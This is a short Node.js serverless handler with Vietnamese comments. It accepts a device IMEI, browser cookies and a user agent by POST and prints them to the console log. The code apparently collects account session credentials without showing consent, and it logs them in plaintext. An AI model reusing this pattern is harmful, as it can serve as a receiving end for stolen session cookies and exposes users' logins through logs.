// ===== API LƯU DỮ LIỆU =====
module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { imei, cookies, userAgent } = req.body;
        
        // Lưu dữ liệu (có thể thay bằng database)
        console.log('IMEI:', imei);
        console.log('Cookies:', cookies);
        console.log('UserAgent:', userAgent);

        res.status(200).json({
            success: true,
            message: 'Data saved successfully'
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
